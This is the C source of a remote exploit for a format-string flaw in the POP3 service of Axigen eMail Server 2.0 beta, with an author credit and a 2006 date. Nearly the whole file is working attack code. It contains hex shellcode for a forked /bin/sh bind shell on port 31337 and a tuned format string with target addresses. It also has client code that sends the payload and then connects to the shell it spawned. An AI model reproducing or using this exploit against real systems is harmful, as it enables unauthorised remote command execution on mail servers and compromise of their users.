/* axiagen.c
 *
 * Axigen eMail Server v2.0 (beta)
 * 	by fuGich Tue Dec 5 2006
 *
 * 		thanks to mu-b
 *
 * - Tested on: Axigen V2 (beta)
 *
 *   logType for the pop3 service must be "system" and 
 *   the logLevel set to any number with 4th bit set
 *
 * remote shell format string vulnerability in pop3
 * 	/bin/sh to bind to port 31337
 *
 * optimised format string generated with libforSC
 * used hhn for writes, could have been hn's but this was small enough and reduces size of log entry generated
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>


#define DEF_PORT    110
#define PORT_POP3   DEF_PORT


char formatString[] =
	
	// plt fixup code

	"\xba\xd8\xbe\x85\x09"		// mov    $0x985bed8,%edx
	"\xc7\x02\x9a\xf0\x04\x08"	// movl   $0x804f09a,(%edx)
	"\x8d\x52\x04"			// lea    0x4(%edx),%edx
	"\xc6\x02\xaa"			// movb   $0xaa,(%edx)
	"\x90\x90\x90"			// make divisible by 8
	
	//
	// bind shell with fork to port 31337 98 bytes
	//

	"\x6a\x66"              // push $0x66 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x6a\x01"              // push $0x1 
	"\x5b"                  // pop %ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x6a\x02"              // push $0x2 

	//
	// <_doint>:
	//

	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 

	"\x5b"                  // pop %ebx 
	"\x5d"                  // pop %ebp 
	"\x52"                  // push %edx 
	"\x66\xbd\x69\x7a"      // mov $0x7a69,%bp (0x7a69 = 31337)
	"\x0f\xcd"              // bswap %ebp 
	"\x09\xdd"              // or %ebx,%ebp 
	"\x55"                  // push %ebp 
	"\x6a\x10"              // push $0x10 
	"\x51"                  // push %ecx 
	"\x50"                  // push %eax 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xb0\x66"              // mov $0x66,%al 
	"\xcd\x80"              // int $0x80 
	"\xb3\x04"              // mov $0x4,%bl 
	"\xb0\x66"              // mov $0x66,%al 
	"\xcd\x80"              // int $0x80 

	//
	// <_acceptloop>:
	//

	"\x5f"                  // pop %edi 
	"\x50"                  // push %eax 
	"\x50"                  // push %eax 
	"\x57"                  // push %edi 
	"\x89\xe1"              // mov %esp,%ecx 
	"\x43"                  // inc %ebx 
	"\xb0\x66"              // mov $0x66,%al 
	"\xcd\x80"              // int $0x80 
	"\x93"                  // xchg %eax,%ebx 
	"\xb0\x02"              // mov $0x2,%al 
	"\xcd\x80"              // int $0x80 
	"\x85\xc0"              // test %eax,%eax 
	"\x75\x1a"              // jne <_parent> 
	"\x59"                  // pop %ecx 

	//
	// <_dup2loop>:
	//

	"\xb0\x3f"              // mov $0x3f,%al 
	"\xcd\x80"              // int $0x80 
	"\x49"                  // dec %ecx 
	"\x79\xf9"              // jns <_dup2loop> 

	"\xb0\x0b"              // mov $0xb,%al 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\xeb\xb2"              // jmp <_doint> 

	//
	// <_parent>:
	//

	"\x6a\x06"              // push $0x6 
	"\x58"                  // pop %eax 
	"\xcd\x80"              // int $0x80 
	"\xb3\x04"              // mov $0x4,%bl 
	"\xeb\xc9"              // jmp <_acceptloop>

	//
	// 9 write addresses
	//

	"\xd8\xbe\x85\x09"	// pointer @ 0x0985bed8
	"\xd9\xbe\x85\x09"
	"\xda\xbe\x85\x09"
	"\xdb\xbe\x85\x09"
	"\xe0\xbe\x85\x09"	// place shell code @ 0x0985bee0
	"\xe1\xbe\x85\x09"
	"\xe2\xbe\x85\x09"
	"\xe3\xbe\x85\x09"
	"\xe4\xbe\x85\x09"

	// add the format string

	"%18u%66$n%34u%65$hhn%31u%72$hhn%10u%68$hhn%31u%71$hhn%87u%70$hhn%14u%69$hhn%90u%73$hhn%158u%67$hhn\r\n";


static int sock_send (int sock, u_char * src, int len);
static void formatme (u_char * host);
static int sockami (u_char * host, int port);
void shell (int sock);

void shell (int sock){		/* Attach to Remote Shell */

	int     l;
	char    buf[512];
	fd_set  rfds;

	while (1) {
		FD_SET (0, &rfds);
		FD_SET (sock, &rfds);
		select (sock + 1, &rfds, NULL, NULL, NULL);
		if (FD_ISSET (0, &rfds)) {
			l = read (0, buf, sizeof (buf));
			if (l <= 0) {
				printf("\n - Connection closed by local user\n");
				exit (EXIT_FAILURE);
			}
			write (sock, buf, l);
		}
		if (FD_ISSET (sock, &rfds)) {
			l = read (sock, buf, sizeof (buf));
			if (l == 0) {
				printf ("\n - Connection closed by remote host.\n");
				exit (EXIT_FAILURE);
			} else if (l < 0) {
				printf ("\n - Read failure\n");
				exit (EXIT_FAILURE);
			}
			write (1, buf, l);
		}
	}
}

static int sock_send (int sock, u_char * src, int len){		/* send data to the open socket */

	int sbytes;
	sbytes = send (sock, src, len, 0);
	return (sbytes);
}

static int sockami (u_char * host, int port){	/* create the socket */

	struct sockaddr_in address;
	struct hostent *hp;
	int sock;

	fflush (stdout);
	if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1){
		perror ("socket()");
		exit (-1);
	}

	if ((hp = gethostbyname (host)) == NULL){
		perror ("gethostbyname()");
		exit (-1);
	}

	memset (&address, 0, sizeof (address));
	memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
	address.sin_family = AF_INET;
	address.sin_port = htons (port);

	if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1){
		perror ("connect()");
		exit (EXIT_FAILURE);
	}
	return (sock);
}

static void formatme (u_char * host){	/* do the evil */

	int sock;
	printf ("+Connecting to %s:%d ", host, PORT_POP3);	
	sock = sockami (host, PORT_POP3);
	printf ("\n+Sending format string\n");
	sock_send (sock, formatString, strlen (formatString));
	fflush (stdout);
	sleep(2);	
	printf ("+Connecting to Shell ");	
	sock = sockami (host, 31337);
	printf ("- Done\n");
	shell(sock);

}

int main (int argc, char **argv){	/* go figure */

	printf ("Axigen 2.0 beta Remote pop3 exploit\n"
		"by: <fuGich@gmail.com>\n\n");

	if (argc <= 1)
	{
		fprintf (stderr, "Usage: %s <host>\n\n", argv[0]);
		exit (EXIT_SUCCESS);
	}

	formatme (argv[1]);
}

